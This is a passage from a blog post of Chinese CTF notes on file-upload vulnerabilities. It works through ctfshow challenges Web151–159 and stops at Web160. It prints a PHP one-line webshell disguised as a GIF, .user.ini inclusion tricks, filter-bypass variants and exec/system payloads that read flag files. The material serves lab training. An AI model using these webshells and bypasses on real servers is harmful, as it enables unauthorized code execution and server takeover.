<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>【CTF-Web】文件上传漏洞学习笔记（ctfshow题目） - 编程大咖</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:url" content="https://bcdaka.github.io/posts/6b790553be3e2724e1ad451ae9cbe98c/">
  <meta property="og:site_name" content="编程大咖">
  <meta property="og:title" content="【CTF-Web】文件上传漏洞学习笔记（ctfshow题目）">
  <meta property="og:description" content="文件上传 文章目录 文件上传What is Upload-File？Upload-File In CTFWeb151考点：前端校验解题： Web152考点：后端校验要严密解题： Web153考点：后端校验 配置文件介绍解题： Web154考点：后端内容校验 大小写绕过解题： Web155考点：后端内容校验 短标签绕过解题： Web156考点：后端内容校验 中括号 符号绕过解题： Web157、158考点：后端内容校验 大括号 符号绕过解题： Web159考点：后端内容校验 小括号 符号绕过解题： Web160考点：后端内容校验 强限制 日志文件包含利用解题： Web161考点：文件头检测解题： Web162Web164考点：PNG图片二次渲染 Web165考点：JPG图片二次渲染 web166考点：zip文件包含 Web167考点：.htaccess解析 web168考点：基础免杀 Web169、170考点：高级免杀 包含日志 What is Upload-File？ 顾名思义就是给网上传文件，比如qq空间
上传文件时服务器后端语言没有对上传的文件进行严格的验证和过滤，容易造成上传任意文件的情况，从而使得攻击者绕过上传机制上传恶意代码并执行控制服务器
恶意代码文件就是php asp aspx jsp等，也被称为webshell
Upload-File In CTF Web151 考点：前端校验 解题： 进来之后很明显一个上传点 并且给出提示
直接上传php后缀文件被禁止 同时任意长传一个其他的后缀 随意输入也被禁止
故为白名单检测 只能上传png后缀格式
于是构造一句话木马放到图片中上传
GIF89a&lt;?php eval($_POST[&#39;a&#39;]);?&gt; 抓包，想要把php的内容解析 需要把后缀修改
在抓包的这一块已经绕过了前端验证
修改 发送 上传成功
得到图片的路径/upload/upload.php
一定注意是php后缀 因为修改过 上传的就是php后缀的文件">
  <meta property="og:locale" content="zh_CN">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-06-03T17:24:52+08:00">
    <meta property="article:modified_time" content="2024-06-03T17:24:52+08:00">

	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
  


</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大咖" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大咖</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">【CTF-Web】文件上传漏洞学习笔记（ctfshow题目）</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-light">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <h2><a id="_0"></a>文件上传</h2> 
<p></p> 
<div class="toc"> 
 <h4>文章目录</h4> 
 <ul><li><a href="#_0" rel="nofollow">文件上传</a></li><li><ul><li><a href="#What_is_UploadFile_2" rel="nofollow">What is Upload-File？</a></li><li><a href="#UploadFile_In_CTF_10" rel="nofollow">Upload-File In CTF</a></li><li><ul><li><a href="#Web151_12" rel="nofollow">Web151</a></li><li><ul><li><a href="#_14" rel="nofollow">考点：前端校验</a></li><li><a href="#_16" rel="nofollow">解题：</a></li></ul> 
    </li><li><a href="#Web152_66" rel="nofollow">Web152</a></li><li><ul><li><a href="#_68" rel="nofollow">考点：后端校验要严密</a></li><li><a href="#_70" rel="nofollow">解题：</a></li></ul> 
    </li><li><a href="#Web153_94" rel="nofollow">Web153</a></li><li><ul><li><a href="#__96" rel="nofollow">考点：后端校验 配置文件介绍</a></li><li><a href="#_98" rel="nofollow">解题：</a></li></ul> 
    </li><li><a href="#Web154_166" rel="nofollow">Web154</a></li><li><ul><li><a href="#__168" rel="nofollow">考点：后端内容校验 大小写绕过</a></li><li><a href="#_170" rel="nofollow">解题：</a></li></ul> 
    </li><li><a href="#Web155_192" rel="nofollow">Web155</a></li><li><ul><li><a href="#__194" rel="nofollow">考点：后端内容校验 短标签绕过</a></li><li><a href="#_196" rel="nofollow">解题：</a></li></ul> 
    </li><li><a href="#Web156_228" rel="nofollow">Web156</a></li><li><ul><li><a href="#___230" rel="nofollow">考点：后端内容校验 中括号 符号绕过</a></li><li><a href="#_232" rel="nofollow">解题：</a></li></ul> 
    </li><li><a href="#Web157158_301" rel="nofollow">Web157、158</a></li><li><ul><li><a href="#___303" rel="nofollow">考点：后端内容校验 大括号 符号绕过</a></li><li><a href="#_305" rel="nofollow">解题：</a></li></ul> 
    </li><li><a href="#Web159_341" rel="nofollow">Web159</a></li><li><ul><li><a href="#___343" rel="nofollow">考点：后端内容校验 小括号 符号绕过</a></li><li><a href="#_345" rel="nofollow">解题：</a></li></ul> 
    </li><li><a href="#Web160_375" rel="nofollow">Web160</a></li><li><ul><li><a href="#___377" rel="nofollow">考点：后端内容校验 强限制 日志文件包含利用</a></li><li><a href="#_379" rel="nofollow">解题：</a></li></ul> 
    </li><li><a href="#Web161_482" rel="nofollow">Web161</a></li><li><ul><li><a href="#_484" rel="nofollow">考点：文件头检测</a></li><li><a href="#_486" rel="nofollow">解题：</a></li></ul> 
    </li><li><a href="#Web162_581" rel="nofollow">Web162</a></li><li><a href="#Web164_591" rel="nofollow">Web164</a></li><li><ul><li><a href="#PNG_593" rel="nofollow">考点：PNG图片二次渲染</a></li></ul> 
    </li><li><a href="#Web165_660" rel="nofollow">Web165</a></li><li><ul><li><a href="#JPG_662" rel="nofollow">考点：JPG图片二次渲染</a></li></ul> 
    </li><li><a href="#web166_689" rel="nofollow">web166</a></li><li><ul><li><a href="#zip_691" rel="nofollow">考点：zip文件包含</a></li></ul> 
    </li><li><a href="#Web167_717" rel="nofollow">Web167</a></li><li><ul><li><a href="#htaccess_719" rel="nofollow">考点：.htaccess解析</a></li></ul> 
    </li><li><a href="#web168_753" rel="nofollow">web168</a></li><li><ul><li><a href="#_755" rel="nofollow">考点：基础免杀</a></li></ul> 
    </li><li><a href="#Web169170_811" rel="nofollow">Web169、170</a></li><li><ul><li><a href="#__813" rel="nofollow">考点：高级免杀 包含日志</a></li></ul> 
   </li></ul> 
  </li></ul> 
 </li></ul> 
</div> 
<p></p> 
<h3><a id="What_is_UploadFile_2"></a>What is Upload-File？</h3> 
<p>顾名思义就是给网上传文件，比如qq空间</p> 
<p>上传文件时服务器后端语言没有对上传的文件进行严格的验证和过滤，容易造成上传任意文件的情况，从而使得攻击者绕过上传机制上传恶意代码并执行控制服务器</p> 
<p>恶意代码文件就是php asp aspx jsp等，也被称为webshell</p> 
<h3><a id="UploadFile_In_CTF_10"></a>Upload-File In CTF</h3> 
<h4><a id="Web151_12"></a>Web151</h4> 
<h5><a id="_14"></a>考点：前端校验</h5> 
<h5><a id="_16"></a>解题：</h5> 
<p><img src="https://images2.imgbox.com/82/e9/qkLzZjut_o.png" alt="image-20240131144641594"></p> 
<p>进来之后很明显一个上传点 并且给出提示</p> 
<p>直接上传php后缀文件被禁止 同时任意长传一个其他的后缀 随意输入也被禁止</p> 
<p>故为白名单检测 只能上传png后缀格式</p> 
<p>于是构造一句话木马放到图片中上传</p> 
<pre><code class="prism language-php">GIF89a<span class="token operator">&lt;</span><span class="token operator">?</span>php <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/ba/d2/YgWLMigH_o.png" alt="image-20240131152056625"></p> 
<p>抓包，想要把php的内容解析 需要把后缀修改</p> 
<p>在抓包的这一块已经绕过了前端验证</p> 
<p><img src="https://images2.imgbox.com/9c/5e/7Zpzau5Q_o.png" alt="image-20240131152156373"></p> 
<p>修改 发送 上传成功</p> 
<p><img src="https://images2.imgbox.com/4e/d6/h1v2bwyo_o.png" alt="image-20240131152539213"></p> 
<p>得到图片的路径<code>/upload/upload.php</code></p> 
<p>一定注意是php后缀 因为修改过 上传的就是php后缀的文件</p> 
<ul><li>法1 ： 直接rce</li></ul> 
<p><img src="https://images2.imgbox.com/23/ab/Zw6Ti8WS_o.png" alt="image-20240131152623585"></p> 
<ul><li>法2 : 中国蚁剑</li></ul> 
<p><img src="https://images2.imgbox.com/5b/94/2NRcTB0y_o.png" alt="image-20240131152741640"></p> 
<p>密码是我们一句话木马里面的参数<code>a</code></p> 
<p><img src="https://images2.imgbox.com/f5/64/caYvVnKy_o.png" alt="image-20240131152828313"></p> 
<p>连接成功</p> 
<p><img src="https://images2.imgbox.com/00/df/UupbTSBc_o.png" alt="image-20240131152848665"></p> 
<h4><a id="Web152_66"></a>Web152</h4> 
<h5><a id="_68"></a>考点：后端校验要严密</h5> 
<h5><a id="_70"></a>解题：</h5> 
<p><img src="https://images2.imgbox.com/c3/a0/JPJQnebx_o.png" alt="image-20240131153040791"></p> 
<p><img src="https://images2.imgbox.com/9c/05/aZkTVAqT_o.png" alt="image-20240131153612836"></p> 
<p>这里和上一题一样 就能打通 但是思考一下题目 为什么说后端验证要严格呢</p> 
<p>这里我们重新构造了一个一句话木马图片不加前缀<code>GIF89a</code></p> 
<p><img src="https://images2.imgbox.com/7c/20/dbfQ2tnu_o.png" alt="image-20240131153918152"></p> 
<p>好吧 效果是一样的hhh</p> 
<p>本来我以为与Content-Type有关</p> 
<blockquote> 
 <ul><li>image/png</li><li>image/gif</li><li>jpg image/jpeg</li></ul> 
</blockquote> 
<p>然鹅并没有 OK 解决 下一题</p> 
<h4><a id="Web153_94"></a>Web153</h4> 
<h5><a id="__96"></a>考点：后端校验 配置文件介绍</h5> 
<h5><a id="_98"></a>解题：</h5> 
<p>再上传一个png 改后缀为php 好！寄</p> 
<p><img src="https://images2.imgbox.com/d2/ac/u5TPLIIS_o.png" alt="image-20240131154809751"></p> 
<p>可以看到msg没有正常显示位置 上传失败</p> 
<p>所以我们使用配置文件去解析一下，配置文件有两个 下面分别介绍一下</p> 
<p><a href="https://www.jianshu.com/p/c2ed6b05c964" rel="nofollow">Reference1</a></p> 
<blockquote> 
 <ul><li> <p>.user.ini</p> <p>在nginx或者Apache服务中都可以使用</p> <p>利用条件：open_basedir没有被限制</p> <p>利用函数：<code>auto_append_file</code> 、 <code>auto_prepend_file</code></p> <p>利用原理：使用该配置文件可以让所有php文件自动包含某个文件</p> </li></ul> 
</blockquote> 
<p>解释两个函数：</p> 
<p><code>auto_append_file</code> : 在加载打开的php文件的第一行代码之后加载配置指定的php文件</p> 
<p><code>auto_prepend_file</code> : 在加载打开的php文件的第一行代码之前加载配置指定的php文件</p> 
<p>利用过程：</p> 
<ol><li>上传一句话木马图片</li><li>上传配置文件</li><li>找到目标服务器任意的php进行访问 会触发我们的配置文件</li></ol> 
<blockquote> 
 <ul><li> <p>.htaccess</p> <p>只能在Apache使用</p> </li></ul> 
</blockquote> 
<p>那我们先探测一下 这个网址的服务是什么</p> 
<p>在kali里面直接<code>whatweb</code></p> 
<pre><code class="prism language-python">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token operator">~</span><span class="token punctuation">]</span>
└─$ whatweb http<span class="token punctuation">:</span><span class="token operator">//</span>340f03f0<span class="token operator">-</span>6c52<span class="token operator">-</span>4b26<span class="token operator">-</span><span class="token number">95e2</span><span class="token operator">-</span>65c0a527be46<span class="token punctuation">.</span>challenge<span class="token punctuation">.</span>ctf<span class="token punctuation">.</span>show<span class="token operator">/</span>
http<span class="token punctuation">:</span><span class="token operator">//</span>340f03f0<span class="token operator">-</span>6c52<span class="token operator">-</span>4b26<span class="token operator">-</span><span class="token number">95e2</span><span class="token operator">-</span>65c0a527be46<span class="token punctuation">.</span>challenge<span class="token punctuation">.</span>ctf<span class="token punctuation">.</span>show<span class="token operator">/</span> <span class="token punctuation">[</span><span class="token number">200</span> OK<span class="token punctuation">]</span> Country<span class="token punctuation">[</span>CHINA<span class="token punctuation">]</span><span class="token punctuation">[</span>CN<span class="token punctuation">]</span><span class="token punctuation">,</span> HTML5<span class="token punctuation">,</span> HTTPServer<span class="token punctuation">[</span>nginx<span class="token operator">/</span><span class="token number">1.20</span><span class="token number">.1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> IP<span class="token punctuation">[</span><span class="token number">124.223</span><span class="token number">.158</span><span class="token number">.81</span><span class="token punctuation">]</span><span class="token punctuation">,</span> JQuery<span class="token punctuation">[</span><span class="token number">3.2</span><span class="token number">.1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> PHP<span class="token punctuation">[</span><span class="token number">7.3</span><span class="token number">.11</span><span class="token punctuation">]</span><span class="token punctuation">,</span> Script<span class="token punctuation">,</span> Title<span class="token punctuation">[</span>CTFshow<span class="token operator">-</span>web入门<span class="token punctuation">]</span><span class="token punctuation">,</span> X<span class="token operator">-</span>Powered<span class="token operator">-</span>By<span class="token punctuation">[</span>PHP<span class="token operator">/</span><span class="token number">7.3</span><span class="token number">.11</span><span class="token punctuation">]</span><span class="token punctuation">,</span> nginx<span class="token punctuation">[</span><span class="token number">1.20</span><span class="token number">.1</span><span class="token punctuation">]</span>
</code></pre> 
<p>发现是nginx 所以使用第一个配置文件</p> 
<p>先上传我们一句话木马构造的png文件 不用抓包了 就直接上传即可</p> 
<p>然后 想办法上传配置文件</p> 
<p>先上传一个正常的png后缀 否则过不了前端 抓包 修改名字和内容</p> 
<p><img src="https://images2.imgbox.com/05/45/1Cay0WMV_o.png" alt="image-20240131165333798"></p> 
<p>然后在upload目录下尝试index.php 确实存在 访问则会触发配置文件</p> 
<p><img src="https://images2.imgbox.com/f9/89/HvIcqKvz_o.png" alt="image-20240131165646048"></p> 
<p><img src="https://images2.imgbox.com/c6/9b/02gY8XEz_o.png" alt="image-20240131165703211"></p> 
<h4><a id="Web154_166"></a>Web154</h4> 
<h5><a id="__168"></a>考点：后端内容校验 大小写绕过</h5> 
<h5><a id="_170"></a>解题：</h5> 
<p><img src="https://images2.imgbox.com/f8/93/U60gDrG9_o.png" alt="image-20240131170824223"></p> 
<p>上传png文件 发现对内容有检测</p> 
<p>先大小写绕过试试</p> 
<p><img src="https://images2.imgbox.com/1c/4b/VNsz08tI_o.png" alt="image-20240131170933236"></p> 
<p>成功</p> 
<p><img src="https://images2.imgbox.com/00/ea/5Xv6FYpz_o.png" alt="image-20240131171015379"></p> 
<p>上传配置文件</p> 
<p><img src="https://images2.imgbox.com/fc/1e/o915eILS_o.png" alt="image-20240131171112212"></p> 
<p>拿到flag</p> 
<h4><a id="Web155_192"></a>Web155</h4> 
<h5><a id="__194"></a>考点：后端内容校验 短标签绕过</h5> 
<h5><a id="_196"></a>解题：</h5> 
<p><img src="https://images2.imgbox.com/71/a3/pkAflvIb_o.png" alt="image-20240204041544098"></p> 
<p>大小写绕过失效 改为短标签</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token operator">?</span><span class="token operator">&gt;</span> 正常写法

<span class="token operator">&lt;</span><span class="token operator">?</span> <span class="token keyword">echo</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token operator">?</span><span class="token operator">&gt;</span> 短标签写法，<span class="token number">5.4</span> 起 <span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">=</span> <span class="token string single-quoted-string">'hello'</span><span class="token punctuation">;</span> <span class="token operator">===</span> <span class="token operator">&lt;</span><span class="token operator">?</span> <span class="token keyword">echo</span> <span class="token string single-quoted-string">'hello'</span><span class="token punctuation">;</span>

<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">=</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span><span class="token operator">&gt;</span>

<span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">echo</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token operator">%</span><span class="token operator">&gt;</span> asp 风格写法

<span class="token operator">&lt;</span>script language<span class="token operator">=</span><span class="token string double-quoted-string">"php"</span><span class="token operator">&gt;</span> <span class="token keyword">echo</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span> 长标签写法
</code></pre> 
<p><img src="https://images2.imgbox.com/b9/ff/oOQ99nff_o.png" alt="image-20240204041735793"></p> 
<p><a href="https://www.cnblogs.com/meng-han/p/16759747.html" rel="nofollow">参考</a></p> 
<p><img src="https://images2.imgbox.com/82/02/bf4UgU5e_o.png" alt="image-20240204041843165"></p> 
<p>直接在上面的包里修改上传即可</p> 
<p><img src="https://images2.imgbox.com/a1/2c/u0rpAedw_o.png" alt="image-20240204042022822"></p> 
<p>拿到flag</p> 
<h4><a id="Web156_228"></a>Web156</h4> 
<h5><a id="___230"></a>考点：后端内容校验 中括号 符号绕过</h5> 
<h5><a id="_232"></a>解题：</h5> 
<p>中括号被限制了</p> 
<p>使用大括号绕过</p> 
<p><img src="https://images2.imgbox.com/b6/ea/V7HH1Fwa_o.png" alt="image-20240204042336019"></p> 
<p>我们要来看看源码学习一下 用蚁剑连接一下</p> 
<p><img src="https://images2.imgbox.com/7f/f2/RVQyWqQC_o.png" alt="image-20240204042547053"></p> 
<p><img src="https://images2.imgbox.com/62/84/wiKVmvxR_o.png" alt="image-20240204042626578"></p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token comment">/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-10-24 19:34:52
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-26 15:49:51
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">]</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"code"</span><span class="token operator">=&gt;</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"msg"</span><span class="token operator">=&gt;</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$filesize</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"size"</span><span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$filesize</span><span class="token operator">&gt;</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    	<span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"code"</span><span class="token operator">=&gt;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"msg"</span><span class="token operator">=&gt;</span><span class="token string double-quoted-string">"文件超过1024KB"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
    	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'image/png'</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
            <span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$ext_suffix</span> <span class="token operator">=</span> <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'extension'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ext_suffix</span><span class="token operator">!=</span><span class="token string single-quoted-string">'php'</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
                <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"php"</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant boolean">FALSE</span> <span class="token operator">&amp;&amp;</span> <span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"["</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant boolean">FALSE</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
                    <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"upload/"</span><span class="token operator">.</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"code"</span><span class="token operator">=&gt;</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"msg"</span><span class="token operator">=&gt;</span><span class="token string double-quoted-string">"upload/"</span><span class="token operator">.</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
                    <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"code"</span><span class="token operator">=&gt;</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"msg"</span><span class="token operator">=&gt;</span><span class="token string double-quoted-string">"文件类型不合规"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
                
            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
                <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"code"</span><span class="token operator">=&gt;</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"msg"</span><span class="token operator">=&gt;</span><span class="token string double-quoted-string">"文件类型不合规"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
    		
    	<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
    		<span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"code"</span><span class="token operator">=&gt;</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"msg"</span><span class="token operator">=&gt;</span><span class="token string double-quoted-string">"文件类型不合规"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    	<span class="token punctuation">}</span>
    	
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>

<span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

</code></pre> 
<p><img src="https://images2.imgbox.com/ea/8b/yyDnpGt3_o.png" alt="image-20240204045040850"></p> 
<h4><a id="Web157158_301"></a>Web157、158</h4> 
<h5><a id="___303"></a>考点：后端内容校验 大括号 符号绕过</h5> 
<h5><a id="_305"></a>解题：</h5> 
<p>这次大括号也被ban了 所以不使用一句话木马 而是直接rce 注意嗷！分号也被ban了 直接删除即可</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?</span> <span class="token function">exec</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cat ../f* &gt; myflag.txt'</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre> 
<p>解释一下命令语句：</p> 
<blockquote> 
 <ul><li>system : 输出并返回最后一行的shell结果</li><li>exec ：不输出结果 返回最后一行shell的结果 所有结果可以保存到一个返回的数组里面</li><li>passthru ：只调用命令，把命令的运行结果原样直接输出到标准输出设备上</li></ul> 
</blockquote> 
<p>在我们的payload中 使用<code>&gt;</code>可以把结果自定义存储到<code>myflag.txt</code>文件中</p> 
<p><img src="https://images2.imgbox.com/b6/48/87JQKras_o.png" alt="image-20240204054616568"></p> 
<p><img src="https://images2.imgbox.com/cd/0c/x9vTKx0N_o.png" alt="image-20240204054657227"></p> 
<p>触发</p> 
<p><img src="https://images2.imgbox.com/65/4d/ZMr0u4H7_o.png" alt="image-20240204054726586"></p> 
<p>查看：注意是在upload目录下</p> 
<p><img src="https://images2.imgbox.com/13/2e/3adr09Qe_o.png" alt="image-20240204054800548"></p> 
<p>也可以直接使用system</p> 
<p><img src="https://images2.imgbox.com/d2/a3/7cMvi3uV_o.png" alt="image-20240204055239398"></p> 
<p><img src="https://images2.imgbox.com/90/3c/y8CdF6Fa_o.png" alt="image-20240204055215518"></p> 
<p><img src="https://images2.imgbox.com/54/ae/YWz5t8EG_o.png" alt="image-20240204055228448"></p> 
<h4><a id="Web159_341"></a>Web159</h4> 
<h5><a id="___343"></a>考点：后端内容校验 小括号 符号绕过</h5> 
<h5><a id="_345"></a>解题：</h5> 
<p>仍然在前端有限制 只能上传png后缀的文件</p> 
<p>所以首先通过png后缀的图片写马</p> 
<p>发现小括号被过滤了，绕过的方法就是 ` 反引号去代替绕过</p> 
<p>两种写马的方法：</p> 
<blockquote> 
 <ol><li>写入到文件中 用 <code>&gt;</code> 进行定向</li></ol> 
 <pre><code class="prism language-shell"><span class="token operator">&lt;</span>? <span class="token variable"><span class="token variable">`</span><span class="token function">cat</span> <span class="token punctuation">..</span>/f* <span class="token operator">&gt;</span> myflag.txt<span class="token variable">`</span></span> ?<span class="token operator">&gt;</span>
</code></pre> 
 <ol start="2"><li>直接使用echo进行显示</li></ol> 
 <pre><code class="prism language-bash"><span class="token operator">&lt;</span>? <span class="token builtin class-name">echo</span> <span class="token variable"><span class="token variable">`</span><span class="token function">tac</span> <span class="token punctuation">..</span>/f*<span class="token variable">`</span></span> ?<span class="token operator">&gt;</span>
</code></pre> 
 <p><img src="https://images2.imgbox.com/80/bf/M6JGr8KP_o.png" alt="image-20240215214117066"></p> 
</blockquote> 
<p>然后通过配置文件<code>.user.ini</code>去解析php</p> 
<p><img src="https://images2.imgbox.com/f7/67/tTvsoy5G_o.png" alt="image-20240215213558967"></p> 
<h4><a id="Web160_375"></a>Web160</h4> 
<h5><a id="___377"></a>考点：后端内容校验 强限制 日志文件包含利用</h5> 
<h5><a id="_379"></a>解题：</h5> 
<p>首先要介绍一下php中<code>include</code>函数：</p> 
